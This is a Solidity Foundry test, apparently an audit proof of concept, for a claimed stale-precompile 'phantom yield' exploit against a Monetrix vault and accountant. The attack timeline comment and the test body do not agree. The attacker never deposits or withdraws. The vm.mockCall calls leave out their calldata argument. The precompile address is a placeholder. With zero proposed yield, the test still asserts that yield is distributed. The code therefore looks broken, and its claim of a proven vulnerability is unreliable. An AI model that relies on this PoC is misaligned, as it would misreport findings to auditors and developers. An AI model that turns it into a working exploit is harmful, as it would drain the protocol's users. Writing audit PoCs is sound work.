// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ATTACK TIMELINE:
// 1. [Setup] Deploy MonetrixAccessController, USDM, InsuranceFund, MonetrixConfig, MonetrixVault, MonetrixAccountant.
// 2. [T=0] Attacker deposits 100,000 USDC into the vault. Vault mints USDM. Accountant tracks 100k backing.
// 3. [T=1] Attacker withdraws their 100,000 USDC position on L1 (HyperCore). Real L1 backing drops to 0.
// 4. [T=2] Precompile latency window: L2 precompiles still return the stale 100,000 USDC balance.
// 5. [T=3] Vault calls settleDailyPnL. Accountant reads stale precompile state, calculates inflated surplus.
// 6. [Assert] Verify accountant.surplus() > 0 despite real L1 backing being 0, proving phantom yield distribution.

import "forge-std/Test.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/InsuranceFund.sol";
import "../src/tokens/USDM.sol";
import "../src/governance/MonetrixAccessController.sol";

interface IERC20Mint {
    function mint(address to, uint256 amount) external;
}

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract AuditAgentPoC is Test {
    MonetrixAccessController acl;
    MockERC20 usdc;
    USDM usdm;
    InsuranceFund insuranceFund;
    MonetrixConfig config;
    MonetrixVault vault;
    MonetrixAccountant accountant;

    address governor = address(0x1);
    address operator = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        acl = new MonetrixAccessController();
        acl.initialize(governor);

        usdc = new MockERC20();

        usdm = new USDM();
        usdm.initialize(address(acl));

        insuranceFund = new InsuranceFund();
        insuranceFund.initialize(address(usdc), address(acl));

        config = new MonetrixConfig();
        config.initialize(address(insuranceFund), governor, address(acl));

        vault = new MonetrixVault();
        address susdm = address(0x456);
        vault.initialize(address(usdc), address(usdm), susdm, address(config), address(this), address(acl));

        accountant = new MonetrixAccountant();
        accountant.initialize(address(vault), address(usdc), address(usdm), address(acl));

        vm.prank(governor);
        vault.setAccountant(address(accountant));

        vm.prank(governor);
        accountant.initializeSettlement();
    }

    function test_exploit() public {
        // Step 1: Attacker supplies 100,000 USDC on L1. 
        // We mock the precompile to return 100,000 USDC (6 decimals) for the attacker's account.
        address precompileMargin = address(0x800); // Example precompile address
        bytes memory mockReturn = abi.encode(int256(100_000e6));
        vm.mockCall(precompileMargin, mockReturn);

        // Step 2: Verify initial state reflects the 100k backing
        int256 initialSurplus = accountant.surplus();

        // Step 3: Attacker withdraws 100,000 USDC on L1. Real backing is now 0.
        // But due to precompile latency, the L2 precompile still returns 100,000 USDC.
        // The mockCall remains active, simulating the stale state.

        // Step 4: Vault calls settleDailyPnL during the latency window
        uint256 proposedYield = 0;
        vm.prank(address(vault));
        uint256 distributable = accountant.settleDailyPnL(proposedYield);

        // Step 5: Assert that the accountant thinks there is surplus (phantom yield)
        // because it read stale precompile data while totalSupply might be 0 or mismatched
        int256 inflatedSurplus = accountant.surplus();

        // The core of the bug: surplus is artificially inflated by stale L1 state
        assertGt(inflatedSurplus, initialSurplus, "Surplus should be inflated by stale precompile");
        assertGt(distributable, 0, "Should distribute phantom yield");

        // Step 6: Precompile finally updates (latency window ends)
        vm.clearMockedCalls();
        bytes memory realReturn = abi.encode(int256(0));
        vm.mockCall(precompileMargin, realReturn);

        // Step 7: Protocol is now undercollateralized
        int256 realSurplus = accountant.surplus();
        assertLt(realSurplus, 0, "Protocol should be undercollateralized after precompile updates");
    }
}
